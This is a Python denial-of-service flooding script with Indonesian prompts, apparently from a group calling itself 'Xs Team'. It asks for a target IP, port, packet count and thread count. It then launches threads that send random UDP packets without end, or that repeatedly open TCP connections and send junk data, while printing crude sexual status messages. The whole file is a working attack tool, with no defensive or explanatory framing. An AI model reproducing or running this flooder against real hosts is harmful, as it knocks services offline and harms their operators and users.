#!/usr/bin/env python3
import random
import socket
import threading
import os

os.system("clear")
print("****** Jangan lupa join Xs Team ******")
print("****** Gak tau mau ngetik apa lagi :)")
ip = str(input(" Masukan Ip Server:"))
port = int(input(" Masukan Port Server:"))
choice = str(input(" Apakah ente yakin mau kirim ni paket ?(iya/gak):"))
times = int(input(" Mau kirim berapa paket ?:"))
threads = int(input(" Mau berapa threads ?:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[Yametee]","[Croottt]","[Kyaahhh]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Ket Paket~~")
		except:
			print("[Croottt] Ahhhh Ahhh Ahhh")

def run2():
	data = random._urandom(16)
	i = random.choice(("[Yametee]","[Croottt]","[Kyaahhh]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Ket Paket~~")
		except:
			s.close()
			print("[Croottt] Kyaahh Terentod Lagii~~")

for iya in range(threads):
	if choice == 'iya':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
